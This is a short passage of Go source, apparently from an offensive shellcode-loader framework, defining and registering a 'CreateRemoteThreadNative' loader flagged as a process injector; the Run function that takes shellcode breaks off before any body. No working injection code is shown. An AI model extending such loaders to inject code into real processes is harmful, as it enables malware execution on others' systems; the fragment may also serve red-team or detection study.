...
const (
	LdrCreateRemoteThreadNative = "createremotethreadnative"
)

type CreateRemoteThreadNativeLoader struct {
	Base
}

func (ldr CreateRemoteThreadNativeLoader) ValidArchs() []string {
	return consts.VALID_ARCH_BOTH
}

func init() {
	ldr := &CreateRemoteThreadNativeLoader{}
	ldr.SuspendProcess = true
	ldr.Injector = true

	AvailableLoaders.Register(LdrCreateRemoteThreadNative, ldr)
}

func (ldr CreateRemoteThreadNativeLoader) Run(shellcode []byte) error {
